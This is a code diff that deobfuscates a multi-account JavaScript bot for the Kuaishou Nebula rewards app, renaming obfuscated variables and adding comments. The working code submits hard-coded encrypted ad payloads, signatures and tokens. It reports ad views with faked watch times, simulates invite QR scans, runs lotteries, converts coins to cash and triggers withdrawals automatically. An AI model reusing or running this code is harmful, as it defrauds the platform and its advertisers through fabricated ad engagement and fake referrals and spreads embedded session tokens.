-    _0x461990["result"] == 1 ? console.log("账号[" + this.name + "]兑换方式更改成功，目前兑换方式为：" + _0x207914) : console.log("账号[" + this.name + "]兑换方式更改失败：" + _0x461990["error_msg"]);
+    result["result"] == 1 ? console.log("账号[" + this.name + "]兑换方式更改成功，目前兑换方式为：" + exchangeType) : console.log("账号[" + this.name + "]兑换方式更改失败：" + result["error_msg"]);
   }
 
   async ["exchangeCoin"]() {
@@ -600,50 +509,53 @@ class UserInfo {
 
     let url = "https://nebula.kuaishou.com/rest/n/nebula/exchange/coinToCash/submit";
 
-    let _0x5264ac = "{\"coinAmount\":" + this["coinBalance"] + ",\"token\":\"rE2zK-Cmc82uOzxMJW7LI2-wTGcKMqqAHE0PhfN0U4bJY4cAM5Inxw\"}",
-        _0x521c54 = populateUrlObject(url, this.cookie, _0x5264ac);
+    let body = "{\"coinAmount\":" + this["coinBalance"] + ",\"token\":\"rE2zK-Cmc82uOzxMJW7LI2-wTGcKMqqAHE0PhfN0U4bJY4cAM5Inxw\"}",
+        urlObject = populateUrlObject(url, this.cookie, body);
 
-    _0x521c54["headers"]["Content-Type"] = "application/json";
-    await httpRequest("post", _0x521c54);
-    let _0x277c5c = httpResult;
+    urlObject["headers"]["Content-Type"] = "application/json";
+    await httpRequest("post", urlObject);
+    let result = httpResult;
 
-    if (!_0x277c5c) {
+    if (!result) {
       return;
     }
 
-    if (_0x277c5c["result"] == 1) {
+    if (result["result"] == 1) {
       let _0x1856d5 = Math["floor"](this["coinBalance"] / 100) * 100,
           _0x5af9a1 = Math["floor"](this["coinBalance"] / 100) / 100;
 
       console.log("账号[" + this.name + "]兑换金币成功，将" + _0x1856d5 + "金币兑换成" + _0x5af9a1 + '元');
     } else {
-      console.log("账号[" + this.name + "]兑换金币失败：" + _0x277c5c["error_msg"]);
+      console.log("账号[" + this.name + "]兑换金币失败：" + result["error_msg"]);
     }
   }
 
-  async ["ksNeoAdParam"](_0x4e6605) {
+  async ksNeoAdParam(taskInfo) {
     let url = "https://api2.e.kuaishou.com/rest/e/v1/reward/ad?kpf=ANDROID_PHONE&kpn=NEBULA";
-    let _0x4cdf1e = "encData=WlTuzeTU6mGT9525bjJUVnlteAACTXpjgjAw%2BtDz1mbM14iDVHdJY0pKd7s5mx8%2BXMRRi7MCE3BSy1NNxI6bywhQueJl4YV8QDNsCONuMI7m59XX7rycrXz5ZPbObMBFLp23dqIF86Do53AbF3u4Dd2Vsk%2B1BzkhUIjucpA2gZ6g837f5Wz19RFfZ9m0pIuu8qg0EFbwOhyvbnybXJXFHahBNDH%2BfHB3V63CQuUJV6MSpBlFU6%2BDiPwORLmSR81ZkexYHIeTr2KafARSUD896R1uB%2BfUnuLqTxnxGmbUG1YIRWBELKXBD6NS9dBoJCaXUCZdA8Iy%2FXwz95700n4l98a9e0fAsnip7ehHiRCNVs7QSEMghZyZDAVZqj1S2XukcCNfZmusnYLyTk3t8pQlfH1PJqbwlA%2BnHpe%2FN8vnOSP0I1F3ZwXHWaaLL2FT%2FvHzk6Ly4osnC45ugzvyKjRmoJhi%2BQBlnOIV9GGpDBWprlbEmer2RVDv4DRCSPt%2Bfiqd3GyKML6S%2B9iWt26PpIzIORn1DyP0X4QaxZNdYWAd3lfYfTjEPXW%2BLtdcMiEYX%2FSqYWyO6zOZ4iovRzLBLXcxsd2EPoe%2B2U5Jw5tw5YBFb1%2BmsANJX9YqA1i1EE1ZlzBOQaFSudn%2Bwvwo3%2FmCfT1CORmlgfrQvWPbMrFqOlO3iSsDWBa3HqTVD82RbV%2BjRlKSPYu56jOpKvtKUHCy%2Fj3nKQZGmN2Pkdsjss0j2MKACMIwDLbOhYo%2B0pP7hY5%2FJMV0pzH65e%2BmSE2dFmbOeA%2BcR8TNtlDnWCEqDDLkMzZ7%2Bh1xWINvXEMVm453edsfnboaSXY24%2FW8RLYkYPoF%2FcMNalSuBF9X7xIw&sign=5a54eecde4d4ea6113782f7bc107d057094e54271e3c02c2eb795e0944356e7b&cs=false&sig=b5f1438be8043fa13cc0feae4408fdc7&client_key=2ac2a76d&__NS_sig3=03126241d268ea6e1d4b48491c78afa2fb133333575a5442&os=android&__NStokensig=a72ad8f8d36f5797858ea6363d8a39754c7e485a15a8d094cc334d249959edd1&token=Cg9rdWFpc2hvdS5hcGkuc3QSoAGJnMSOANoNbM6ND_OdEzBSJT4dCPjOk56DU5u5eK0bhKo1g4aIZ54x3Gd6DvRjA1Jc_CYqAnTdqHez5240vfyWqpMYv7neRWKjUx2DoZzjyFP65DNbluF2-8xcCPwAtUFH9l9xuSxRukRU7MJZS8JCZbdWZkiTtn7XwYgX9pP3OFrjlduNj2UhLZqyb1LTLoA5bbBAyelqOUJWgrv5kx0fGhLZe8NH31JEM6ppJzAS6A8iBVUiIDZhUfY1IjzcFcyxDdAHsjSY7hQCepATcGWmABMlxirPKAUwAQ";
+    let body = "encData=WlTuzeTU6mGT9525bjJUVnlteAACTXpjgjAw%2BtDz1mbM14iDVHdJY0pKd7s5mx8%2BXMRRi7MCE3BSy1NNxI6bywhQueJl4YV8QDNsCONuMI7m59XX7rycrXz5ZPbObMBFLp23dqIF86Do53AbF3u4Dd2Vsk%2B1BzkhUIjucpA2gZ6g837f5Wz19RFfZ9m0pIuu8qg0EFbwOhyvbnybXJXFHahBNDH%2BfHB3V63CQuUJV6MSpBlFU6%2BDiPwORLmSR81ZkexYHIeTr2KafARSUD896R1uB%2BfUnuLqTxnxGmbUG1YIRWBELKXBD6NS9dBoJCaXUCZdA8Iy%2FXwz95700n4l98a9e0fAsnip7ehHiRCNVs7QSEMghZyZDAVZqj1S2XukcCNfZmusnYLyTk3t8pQlfH1PJqbwlA%2BnHpe%2FN8vnOSP0I1F3ZwXHWaaLL2FT%2FvHzk6Ly4osnC45ugzvyKjRmoJhi%2BQBlnOIV9GGpDBWprlbEmer2RVDv4DRCSPt%2Bfiqd3GyKML6S%2B9iWt26PpIzIORn1DyP0X4QaxZNdYWAd3lfYfTjEPXW%2BLtdcMiEYX%2FSqYWyO6zOZ4iovRzLBLXcxsd2EPoe%2B2U5Jw5tw5YBFb1%2BmsANJX9YqA1i1EE1ZlzBOQaFSudn%2Bwvwo3%2FmCfT1CORmlgfrQvWPbMrFqOlO3iSsDWBa3HqTVD82RbV%2BjRlKSPYu56jOpKvtKUHCy%2Fj3nKQZGmN2Pkdsjss0j2MKACMIwDLbOhYo%2B0pP7hY5%2FJMV0pzH65e%2BmSE2dFmbOeA%2BcR8TNtlDnWCEqDDLkMzZ7%2Bh1xWINvXEMVm453edsfnboaSXY24%2FW8RLYkYPoF%2FcMNalSuBF9X7xIw&sign=5a54eecde4d4ea6113782f7bc107d057094e54271e3c02c2eb795e0944356e7b&cs=false&sig=b5f1438be8043fa13cc0feae4408fdc7&client_key=2ac2a76d&__NS_sig3=03126241d268ea6e1d4b48491c78afa2fb133333575a5442&os=android&__NStokensig=a72ad8f8d36f5797858ea6363d8a39754c7e485a15a8d094cc334d249959edd1&token=Cg9rdWFpc2hvdS5hcGkuc3QSoAGJnMSOANoNbM6ND_OdEzBSJT4dCPjOk56DU5u5eK0bhKo1g4aIZ54x3Gd6DvRjA1Jc_CYqAnTdqHez5240vfyWqpMYv7neRWKjUx2DoZzjyFP65DNbluF2-8xcCPwAtUFH9l9xuSxRukRU7MJZS8JCZbdWZkiTtn7XwYgX9pP3OFrjlduNj2UhLZqyb1LTLoA5bbBAyelqOUJWgrv5kx0fGhLZe8NH31JEM6ppJzAS6A8iBVUiIDZhUfY1IjzcFcyxDdAHsjSY7hQCepATcGWmABMlxirPKAUwAQ";
 
-    let _0x5ed6ef = populateUrlObject(url, this.cookie, _0x4cdf1e);
+    let urlObject = populateUrlObject(url, this.cookie, body);
 
-    await httpRequest("post", _0x5ed6ef);
-    let _0x456c2a = httpResult;
+    await httpRequest("post", urlObject);
+    let result = httpResult;
 
-    if (!_0x456c2a) {
+    console.log('ksNeoAdParam', taskInfo, result)
+
+    if (!result) {
+      console.log(`${taskInfo.name}运行结果：失败。原因：${result.error_msg}\n`)
       return;
     }
 
-    _0x456c2a["result"] == 1 ? _0x456c2a["impAdInfo"] && _0x456c2a["impAdInfo"]["length"] > 0 && _0x456c2a["impAdInfo"][0]["adInfo"] && _0x456c2a["impAdInfo"][0]["adInfo"]["length"] > 0 && _0x456c2a["impAdInfo"][0]["adInfo"][0]["adBaseInfo"] && (await $.wait(200), await this["ksNeoAdReward"](_0x456c2a["llsid"], _0x456c2a["impAdInfo"][0]["adInfo"][0]["adBaseInfo"]["creativeId"], _0x4e6605)) : console.log("账号[" + this.name + "]获取" + _0x4e6605["name"] + "参数失败：" + _0x456c2a["error_msg"]);
+    result["result"] == 1 ? result["impAdInfo"] && result["impAdInfo"]["length"] > 0 && result["impAdInfo"][0]["adInfo"] && result["impAdInfo"][0]["adInfo"]["length"] > 0 && result["impAdInfo"][0]["adInfo"][0]["adBaseInfo"] && (await $.wait(200), await this["ksNeoAdReward"](result["llsid"], result["impAdInfo"][0]["adInfo"][0]["adBaseInfo"]["creativeId"], taskInfo)) : console.log("账号[" + this.name + "]获取" + taskInfo["name"] + "参数失败：" + result["error_msg"]);
   }
 
-  async ["ksNeoAdReward"](_0x356807, _0x147c72, _0x1de17f) {
-    let _0x48719b = new Date().getTime(),
-        _0x17451c = Math["floor"](Math["random"]() * 30000) + 45000,
-        _0x356f19 = _0x48719b - _0x17451c;
+  async ksNeoAdReward(llsid, creativeId, info) {
+    let endTime = new Date().getTime(),
+        randomTime = Math["floor"](Math["random"]() * 30000) + 45000,
+        startTime = endTime - randomTime;
 
     let url = "https://api.e.kuaishou.com/rest/r/ad/task/report",
-        body = "bizStr={\"businessId\":" + _0x1de17f["businessId"] + ",\"endTime\":" + _0x48719b + ",\"extParams\":\"" + _0x1de17f["extParams"] + "\",\"mediaScene\":\"video\",\"neoInfos\":[{\"creativeId\":" + _0x147c72 + ",\"extInfo\":\"\",\"llsid\":" + _0x356807 + ",\"taskType\":1}],\"pageId\":" + _0x1de17f["pageId"] + ",\"posId\":" + _0x1de17f["posId"] + ",\"startTime\":" + _0x356f19 + ",\"subPageId\":" + _0x1de17f["subPageId"] + '}',
+        body = "bizStr={\"businessId\":" + info["businessId"] + ",\"endTime\":" + endTime + ",\"extParams\":\"" + info["extParams"] + "\",\"mediaScene\":\"video\",\"neoInfos\":[{\"creativeId\":" + creativeId + ",\"extInfo\":\"\",\"llsid\":" + llsid + ",\"taskType\":1}],\"pageId\":" + info["pageId"] + ",\"posId\":" + info["posId"] + ",\"startTime\":" + startTime + ",\"subPageId\":" + info["subPageId"] + '}',
         urlObject = populateUrlObject(url, this.cookie, body);
 
     await httpRequest("post", urlObject);
@@ -654,35 +566,35 @@ class UserInfo {
     }
 
     if (result["result"] == 1) {
-      let _0x57d678 = result["data"]["neoAmount"] + '金币';
+      let neoAmount = result["data"]["neoAmount"] + '金币';
 
       if (result["data"]["neoToH5Data"]) {
         try {
-          let _0x3b4db4 = JSON.parse(Base64["decode"](result["data"]["neoToH5Data"])["replace"](/\0/g, ''));
+          let neoToH5Data = JSON.parse(Base64["decode"](result["data"]["neoToH5Data"])["replace"](/\0/g, ''));
 
-          _0x3b4db4["extraCoin"] && (_0x57d678 += '+' + _0x3b4db4["extraCoin"] + '金币');
-        } catch (_0x2ac89f) {
+          neoToH5Data["extraCoin"] && (neoAmount += '+' + neoToH5Data["extraCoin"] + '金币');
+        } catch (e) {
           console.log(result["data"]["neoToH5Data"]);
         } finally {}
       }
 
-      console.log("账号[" + this.name + ']看' + _0x1de17f["name"] + '获得' + _0x57d678);
+      console.log("账号[" + this.name + ']看' + info["name"] + '获得' + neoAmount);
 
       if (this.hasLuckydraw) {
         await this["luckdrawTasks"]();
       }
     } else {
-      console.log("账号[" + this.name + ']看' + _0x1de17f["name"] + "失败：" + result["error_msg"]);
+      console.log("账号[" + this.name + ']看' + info["name"] + "失败：" + result["error_msg"]);
     }
   }
 
-  async ["luckdrawInfo"]() {
+  async luckdrawInfo() {
     let url = "https://activity.e.kuaishou.com/rest/r/game/user/info",
-        _0x5821ab = '';
+        body = '';
 
-    let _0x55c974 = populateUrlObject(url, this.cookie, _0x5821ab);
+    let urlObject = populateUrlObject(url, this.cookie, body);
 
-    await httpRequest("get", _0x55c974);
+    await httpRequest("get", urlObject);
     let result = httpResult;
 
     if (!result) {
@@ -692,7 +604,7 @@ class UserInfo {
     if (result["result"] == 1) {
       console.log("账号[" + this.name + "]现有" + result["data"]["userDiamondResult"]["diamondPercent"] + "钻石，剩余抽奖次数：" + result["data"]["userDailyLotteryTimesResult"]["remainTimes"]);
 
-      for (let _0x2e2465 = 0; _0x2e2465 < result["data"]["userDailyLotteryTimesResult"]["remainTimes"]; _0x2e2465++) {
+      for (let i = 0; i < result["data"]["userDailyLotteryTimesResult"]["remainTimes"]; i++) {
         await $.wait(200);
         await this["luckydraw"]();
       }
@@ -701,13 +613,13 @@ class UserInfo {
     }
   }
 
-  async ["luckydraw"]() {
+  async luckydraw() {
     let url = "https://activity.e.kuaishou.com/rest/r/game/lottery?wheelVersion=1";
 
-    let _0x33c2d6 = '',
-        _0xa918b3 = populateUrlObject(url, this.cookie, _0x33c2d6);
+    let body = '',
+        urlObject = populateUrlObject(url, this.cookie, body);
 
-    await httpRequest("post", _0xa918b3);
+    await httpRequest("post", urlObject);
     let result = httpResult;
 
     if (!result) {
@@ -715,9 +627,9 @@ class UserInfo {
     }
 
     if (result["result"] == 1) {
-      let _0x2074e9 = result["data"]["coinCount"] ? result["data"]["coinCount"] + '金币' : result["data"]["diamondCount"] ? result["data"]["diamondCount"] + '钻石' : '空气';
+      let coinCount = result["data"]["coinCount"] ? result["data"]["coinCount"] + '金币' : result["data"]["diamondCount"] ? result["data"]["diamondCount"] + '钻石' : '空气';
 
-      console.log("账号[" + this.name + "]抽奖获得" + _0x2074e9);
+      console.log("账号[" + this.name + "]抽奖获得" + coinCount);
 
       if (result["data"]["videoCoinCount"]) {
         console.log("额外奖励：" + result["data"]["videoCoinCount"]);
@@ -736,14 +648,14 @@ class UserInfo {
       console.log("账号[" + this.name + "]抽奖失败：" + result["error_msg"]);
     }
   }
-
-  async ["luckydrawSign"]() {
+  // 抽奖页签到成功
+  async luckydrawSign() {
     let url = "https://activity.e.kuaishou.com/rest/r/game/sign-in";
 
-    let _0x487bbe = '',
-        _0x5506dc = populateUrlObject(url, this.cookie, _0x487bbe);
+    let body = '',
+        urlObject = populateUrlObject(url, this.cookie, body);
 
-    await httpRequest("get", _0x5506dc);
+    await httpRequest("get", urlObject);
     let result = httpResult;
 
     if (!result) {
@@ -752,42 +664,42 @@ class UserInfo {
 
     result["result"] == 1 ? result["data"]["isShow"] && console.log("账号[" + this.name + "]抽奖页签到成功") : (console.log("账号[" + this.name + "]查询抽奖签到情况失败：" + result["error_msg"]), result["error_msg"]["indexOf"]("激励游戏未在运营") > -1 && (this.hasLuckydraw = false));
   }
-
-  async ["luckdrawTimerInfo"]() {
+  // 获取抽奖页定时奖励次数详情
+  async luckdrawTimerInfo() {
     let url = "https://activity.e.kuaishou.com/rest/r/game/timer-reward/info",
-        _0x3e34bf = '';
+        body = '';
 
-    let _0x2bb61e = populateUrlObject(url, this.cookie, _0x3e34bf);
+    let urlObject = populateUrlObject(url, this.cookie, body);
 
-    await httpRequest("get", _0x2bb61e);
-    let _0x41bd2d = httpResult;
+    await httpRequest("get", urlObject);
+    let result = httpResult;
 
-    if (!_0x41bd2d) {
+    if (!result) {
       return;
     }
 
-    if (_0x41bd2d["result"] == 1) {
-      if (_0x41bd2d["data"]) {
-        let _0x290366 = new Date().getTime(),
-            _0x4790a4 = _0x41bd2d["data"]["lastTimerTime"],
-            _0x4f65d1 = _0x41bd2d["data"]["minutesInterval"] * 60 * 1000,
-            _0x15dafc = _0x4790a4 + _0x4f65d1;
+    if (result["result"] == 1) {
+      if (result["data"]) {
+        let currentTime = new Date().getTime(),
+            lastTimerTime = result["data"]["lastTimerTime"],
+            minutesInterval = result["data"]["minutesInterval"] * 60 * 1000,
+            dixTime = lastTimerTime + minutesInterval;
 
-        _0x290366 < _0x15dafc ? console.log("账号[" + this.name + "]抽奖页奖励冷却时间还有" + (_0x15dafc - _0x290366) / 1000 + '秒') : (await $.wait(200), await this["luckdrawTimerReward"](_0x41bd2d["data"]["goldNum"]));
+        currentTime < dixTime ? console.log("账号[" + this.name + "]抽奖页奖励冷却时间还有" + (dixTime - currentTime) / 1000 + '秒') : (await $.wait(200), await this["luckdrawTimerReward"](result["data"]["goldNum"]));
       } else {
         console.log("账号[" + this.name + "]抽奖页定时奖励次数已用完");
       }
     } else {
-      console.log("账号[" + this.name + "]查询抽奖页定时奖励情况失败：" + _0x41bd2d["error_msg"]);
+      console.log("账号[" + this.name + "]查询抽奖页定时奖励情况失败：" + result["error_msg"]);
     }
   }
 
   async ["luckdrawTimerReward"](_0x4487d6) {
     let url = "https://activity.e.kuaishou.com/rest/r/game/timer-reward",
-        _0x5d0d4e = '',
-        _0x3f340d = populateUrlObject(url, this.cookie, _0x5d0d4e);
+        body = '',
+        urlObject = populateUrlObject(url, this.cookie, body);
 
-    await httpRequest("post", _0x3f340d);
+    await httpRequest("post", urlObject);
     let result = httpResult;
 
     if (!result) {
@@ -796,14 +708,14 @@ class UserInfo {
 
     result["result"] == 1 ? console.log("账号[" + this.name + "]领取抽奖页定时奖励获得" + _0x4487d6 + '金币') : console.log("账号[" + this.name + "]领取抽奖页定时奖励失败：" + result["error_msg"]);
   }
-
-  async ["luckdrawTasks"]() {
+  // 领取抽奖任务
+  async luckdrawTasks() {
     let url = "https://activity.e.kuaishou.com/rest/r/game/tasks";
-    let _0x3b9a22 = '';
+    let body = '';
 
-    let _0x2f1fa0 = populateUrlObject(url, this.cookie, _0x3b9a22);
+    let urlObject = populateUrlObject(url, this.cookie, body);
 
-    await httpRequest("get", _0x2f1fa0);
+    await httpRequest("get", urlObject);
     let result = httpResult;
 
     if (!result) {
@@ -811,44 +723,45 @@ class UserInfo {
     }
 
     if (result["result"] == 1) {
-      for (let _0x533a83 of result["data"]["dailyTasks"]) {
-        _0x533a83["taskState"] == 1 && (await $.wait(200), await this["luckdrawTasksReward"](_0x533a83));
+      for (let t of result["data"]["dailyTasks"]) {
+        t["taskState"] == 1 && (await $.wait(200), await this["luckdrawTasksReward"](t));
       }
 
-      for (let _0x52a7d3 of result["data"]["growthTasks"]) {
-        _0x52a7d3["taskState"] == 1 && (await $.wait(200), await this["luckdrawTasksReward"](_0x52a7d3));
+      for (let gt of result["data"]["growthTasks"]) {
+        gt["taskState"] == 1 && (await $.wait(200), await this["luckdrawTasksReward"](gt));
       }
     } else {
       console.log("账号[" + this.name + "]查询抽奖页任务失败：" + result["error_msg"]);
     }
   }
+  // 领取抽奖任务reward
+  async luckdrawTasksReward(info) {
+    let url = "https://activity.e.kuaishou.com/rest/r/game/task/reward-receive?taskName=" + info["taskName"],
+        body = '';
 
-  async ["luckdrawTasksReward"](_0x1d466b) {
-    let url = "https://activity.e.kuaishou.com/rest/r/game/task/reward-receive?taskName=" + _0x1d466b["taskName"],
-        _0x574f7f = '';
+    let urlObject = populateUrlObject(url, this.cookie, body);
 
-    let _0x39dec1 = populateUrlObject(url, this.cookie, _0x574f7f);
-
-    await httpRequest("get", _0x39dec1);
+    await httpRequest("get", urlObject);
     let result = httpResult;
 
     if (!result) {
       return;
     }
 
-    result["result"] == 1 ? console.log("账号[" + this.name + "]领取抽奖任务[" + _0x1d466b["taskTitle"] + "]奖励获得" + result["data"]["popUp"]["taskRewardName"]) : console.log("账号[" + this.name + "]领取抽奖任务[" + _0x1d466b["taskTitle"] + "]奖励失败：" + result["error_msg"]);
+    result["result"] == 1 ? console.log("账号[" + this.name + "]领取抽奖任务[" + info["taskTitle"] + "]奖励获得" + result["data"]["popUp"]["taskRewardName"]) : console.log("账号[" + this.name + "]领取抽奖任务[" + info["taskTitle"] + "]奖励失败：" + result["error_msg"]);
   }
 
-  async ["helpInvite"](_0x187e92) {
-    let _0x3ca342 = _0x187e92["split"]('&'),
-        _0xe3f1cd = _0x3ca342[0],
-        _0x11a14c = _0x3ca342[1],
+  // 助力
+  async helpInvite(cks) {
+    let ckInfo = cks["split"]('&'),
+        fid = ckInfo[0],
+        shareToken = ckInfo[1],
         url = "https://nebula.kuaishou.com/rest/n/nebula/qrcode?version=1.2.0",
-        _0x3d5843 = '',
-        _0x30ab8e = populateUrlObject(url, this.cookie, _0x3d5843);
+        body = '',
+        urlObject = populateUrlObject(url, this.cookie, body);
 
-    _0x30ab8e["headers"]["Referer"] = "https://nebula.kuaishou.com/fission/face-qrcode?fid=" + _0xe3f1cd + "&shareToken=" + _0x11a14c + "&source=qrcode";
-    await httpRequest("get", _0x30ab8e);
+    urlObject["headers"]["Referer"] = "https://nebula.kuaishou.com/fission/face-qrcode?fid=" + fid + "&shareToken=" + shareToken + "&source=qrcode";
+    await httpRequest("get", urlObject);
     let result = httpResult;
 
     if (!result) {
@@ -858,39 +771,39 @@ class UserInfo {
     !(result["result"] == 1) && console.log("账号[" + this.name + "]邀请失败：" + result["error_msg"]);
   }
 
-  async ["helpScan"](_0x5b9bcd) {
-    let _0x1353c8 = _0x5b9bcd["split"]('&'),
-        _0x3c13f7 = _0x1353c8[0];
+  //  扫码助力
+  async helpScan(cks) {
+    let ckInfo = cks["split"]('&'),
+        fid = ckInfo[0];
+        shareToken = ckInfo[1];
 
-    let _0x5defce = _0x1353c8[1];
-
-    if (_0x3c13f7 == this["userId"]) {
+    if (fid == this["userId"]) {
       return;
     }
 
     let url = "https://api.kuaishouzt.com/rest/zt/share/show/any";
 
-    let _0x30d37f = "theme=light&sdkVersion=1.14.0.4&kpf=ANDROID_PHONE&shareMessage=https%3A%2F%2Fnicdd.get666bjrqu985xvp14v.com%2Ff%2F" + _0x5defce + "%3FlayoutType%3D4&kpn=NEBULA&launchState=hotLaunch&sessionId=ac165e40-48bd-42de-9fc5-b250d7eb983c&extTransientParams=%7B%22source%22%3A%22userScanCamera%22%7D";
+    let body = "theme=light&sdkVersion=1.14.0.4&kpf=ANDROID_PHONE&shareMessage=https%3A%2F%2Fnicdd.get666bjrqu985xvp14v.com%2Ff%2F" + shareToken + "%3FlayoutType%3D4&kpn=NEBULA&launchState=hotLaunch&sessionId=ac165e40-48bd-42de-9fc5-b250d7eb983c&extTransientParams=%7B%22source%22%3A%22userScanCamera%22%7D";
 
-    let _0x8b6113 = populateUrlObject(url, this.cookie, _0x30d37f);
+    let urlObject = populateUrlObject(url, this.cookie, body);
 
-    await httpRequest("post", _0x8b6113);
+    await httpRequest("post", urlObject);
     let result = httpResult;
 
     if (!result) {
       return;
     }
 
-    result["result"] == 1 ? (await $.wait(100), await this["helpInvite"](_0x5b9bcd)) : console.log("账号[" + this.name + "]模拟邀请二维码扫描失败：" + result["error_msg"]);
+    result["result"] == 1 ? (await $.wait(100), await this["helpInvite"](cks)) : console.log("账号[" + this.name + "]模拟邀请二维码扫描失败：" + result["error_msg"]);
   }
-
-  async ["bindInfo"]() {
+  // 查询提现账号绑定情况
+  async bindInfo() {
     let url = "https://www.kuaishoupay.com/pay/account/h5/provider/bind_info";
-    let _0x5a3f62 = "account_group_key=NEBULA_CASH_ACCOUNT&bind_page_type=3";
+    let body = "account_group_key=NEBULA_CASH_ACCOUNT&bind_page_type=3";
 
-    let _0x3a328a = populateUrlObject(url, this.cookie, _0x5a3f62);
+    let urlObject = populateUrlObject(url, this.cookie, body);
 
-    await httpRequest("post", _0x3a328a);
+    await httpRequest("post", urlObject);
     let result = httpResult;
 
     if (!result) {
@@ -907,13 +820,13 @@ class UserInfo {
       console.log("账号[" + this.name + "]查询提现账号绑定情况失败：" + result["error_msg"]);
     }
   }
-
-  async ["accountInfo"]() {
+  // 查询账号提现情况
+  async accountInfo() {
     let url = "https://www.kuaishoupay.com/pay/account/h5/withdraw/account_info",
-        _0x318443 = "account_group_key=NEBULA_CASH_ACCOUNT&providers=",
-        _0x1154ea = populateUrlObject(url, this.cookie, _0x318443);
+        body = "account_group_key=NEBULA_CASH_ACCOUNT&providers=",
+        urlObject = populateUrlObject(url, this.cookie, body);
 
-    await httpRequest("post", _0x1154ea);
+    await httpRequest("post", urlObject);
     let result = httpResult;
 
     if (!result) {
@@ -957,7 +870,7 @@ class UserInfo {
       await $.wait(200);
       await user.luckydrawSign();
       await $.wait(200);
-
+      console.log('user---:', user)
       if (user.hasLuckydraw == true) {
         await user.luckdrawTimerInfo();
         await $.wait(200);
@@ -968,36 +881,36 @@ class UserInfo {
       }
 
       if (user.task[taskTypes.luckydraw].needRun) {
-        for (let _0x365066 = 0; _0x365066 < user.task[taskTypes.luckydraw].num; _0x365066++) {
-          _0x20a9d7 < 13 ? (await user.ksNeoAdParam(_0x57d7ea["luckdrawVideo_161_213"]), await $.wait(200), await user.ksNeoAdParam(_0x57d7ea["luckdrawVideo_11_213"]), await $.wait(200)) : (await user.ksNeoAdParam(_0x57d7ea["luckdrawVideo_161_100"]), await $.wait(200), await user.ksNeoAdParam(_0x57d7ea["luckdrawVideo_11_100"]), await $.wait(200));
+        for (let i = 0; i < user.task[taskTypes.luckydraw].num; i++) {
+          currentHour < 13 ? (await user.ksNeoAdParam(luckydrawInfo["luckdrawVideo_161_213"]), await $.wait(200), await user.ksNeoAdParam(luckydrawInfo["luckdrawVideo_11_213"]), await $.wait(200)) : (await user.ksNeoAdParam(luckydrawInfo["luckdrawVideo_161_100"]), await $.wait(200), await user.ksNeoAdParam(luckydrawInfo["luckdrawVideo_11_100"]), await $.wait(200));
         }
       }
 
       if (user.task[taskTypes.ad].needRun) {
         for (let k = 0; k < user.task[taskTypes.ad].num; k++) {
-          await user.ksAdParam(_0x1462dc["ad1"]);
+          await user.ksAdParam(ksAdInfo["ad1"]);
           await $.wait(200);
           k != user.task[taskTypes.ad].num - 1 && (await $.wait(2000));
         }
       }
 
       if (user.task[taskTypes.gj].needRun) {
-        for (let _0x2cceb1 = 0; _0x2cceb1 < user.task[taskTypes.gj].num; _0x2cceb1++) {
+        for (let k = 0; k < user.task[taskTypes.gj].num; k++) {
           await user.ksgj();
           await $.wait(200);
         }
       }
 
       if (user.task[taskTypes.live].needRun) {
-        for (let _0x5e03f8 = 0; _0x5e03f8 < user.task[taskTypes.live].num; _0x5e03f8++) {
-          await user.ksNeoAdParam(_0x57d7ea["liveVideo_75"]);
+        for (let k = 0; k < user.task[taskTypes.live].num; k++) {
+          await user.ksNeoAdParam(luckydrawInfo["liveVideo_75"]);
           await $.wait(200);
         }
       }
 
       if (user.task[taskTypes.invite].needRun) {
-        for (let _0x1af09b = 0; _0x1af09b < user.task[taskTypes.invite].num; _0x1af09b++) {
-          await user.ksNeoAdParam(_0x57d7ea["inviteVideo_2008"]);
+        for (let k = 0; k < user.task[taskTypes.invite].num; k++) {
+          await user.ksNeoAdParam(luckydrawInfo["inviteVideo_2008"]);
           await $.wait(200);
         }
       }
@@ -1015,30 +928,30 @@ class UserInfo {
     }
 
     console.log("\n============== 自动提现 ==============");
-    let _0x2c3495 = "按提现列表自动提现";
+    let cashStr = "按提现列表自动提现";
 
     if (ksjsbCash) {
-      _0x2c3495 = "自动提现" + ksjsbCash + '元';
+      cashStr = "自动提现" + ksjsbCash + '元';
     }
 
-    ksjsbAggressive && (_0x2c3495 = "最大化提现");
+    ksjsbAggressive && (cashStr = "最大化提现");
 
-    if (_0x20a9d7 == ksjsbWithdrawTime) {
-      console.log("提现时间，现在设置为" + _0x2c3495);
+    if (currentHour == ksjsbWithdrawTime) {
+      console.log("提现时间，现在设置为" + cashStr);
 
-      for (let _0x5eb9a3 of validUserList) {
-        await _0x5eb9a3["withdrawOverview"]();
+      for (let user of validUserList) {
+        await user.withdrawOverview();
         await $.wait(200);
       }
     } else {
-      console.log("非提现时间，现在设置为" + ksjsbWithdrawTime + '点' + _0x2c3495);
+      console.log("非提现时间，现在设置为" + ksjsbWithdrawTime + '点' + cashStr);
     }
 
     await _0x217ea6();
 
-    if (_0x5718d8["length"] > 0) {
+    if (inviteList["length"] > 0) {
       for (let _0x1e7eac of validUserList) {
-        for (let _0x52333f of _0x5718d8) {
+        for (let _0x52333f of inviteList) {
           await _0x1e7eac["helpScan"](_0x52333f);
           await $.wait(200);
         }
@@ -1049,7 +962,7 @@ class UserInfo {
       await showmsg();
     } else {
       if (notifyFlag == 1) {
-        _0x20a9d7 == ksjsbWithdrawTime && (await showmsg());
+        currentHour == ksjsbWithdrawTime && (await showmsg());
       }
     }
   }
@@ -1143,23 +1056,23 @@ async function pushDear(str) {
   console.log("\n========== PushDear 通知发送" + retStr + " ==========\n");
 }
 
-async function _0x505e51() {
-  const _0x5a83bb = {
+async function checkVersion() {
+  const body = {
     "url": _0x180c0c,
     "headers": ''
   };
-  await httpRequest("get", _0x5a83bb);
-  let _0x339fc4 = httpResult;
+  await httpRequest("get", body);
+  let result = httpResult;
 
-  if (!_0x339fc4) {
+  if (!result) {
     return;
   }
 
-  if (_0x339fc4[_0x5bc515]) {
-    let _0x17f43b = _0x339fc4[_0x5bc515];
+  if (result[jsnameStr]) {
+    let _0x17f43b = result[jsnameStr];
 
     if (_0x17f43b["status"] == 0) {
-      if (_0x459e63 >= _0x17f43b["version"]) {
+      if (version >= _0x17f43b["version"]) {
         _0x2e716e = true;
         _0x75eec0 = "https://127.0.0.1/";
         console.log(_0x17f43b["msg"][_0x17f43b["status"]]);
@@ -1172,30 +1085,30 @@ async function _0x505e51() {
       console.log(_0x17f43b["msg"][_0x17f43b["status"]]);
     }
   } else {
-    console.log(_0x339fc4["errorMsg"]);
+    console.log(result["errorMsg"]);
   }
 }
 
 async function _0x217ea6() {
-  let _0x2c06d9 = '';
+  let flag = '';
